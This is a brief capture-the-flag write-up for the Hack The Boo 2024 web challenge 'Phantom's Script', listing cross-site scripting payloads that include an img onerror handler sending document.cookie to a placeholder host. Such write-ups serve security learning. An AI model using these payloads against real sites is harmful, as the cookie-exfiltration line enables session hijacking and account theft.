# Hack The Boo 2024 Write-Up

## WEB

### Phantom's Script

![image](https://github.com/user-attachments/assets/1d5b113b-039a-46ba-8470-0c8688fd03c4)

Basic XSS Payload:

`<script>alert('Boo!');</script>`

`<script>fetch('[host]')</script>`

More Diabolical Payload:

`<img src=x onerror="alert('Boo!')">`

`<img src=x onerror="fetch('[HOST]' + document.cookie)" />`

Use XSS payload `<script>fetch('[host]')</script>`

![image](https://github.com/user-attachments/assets/3bd034b8-1f32-4c04-9ebe-b96564676f02)

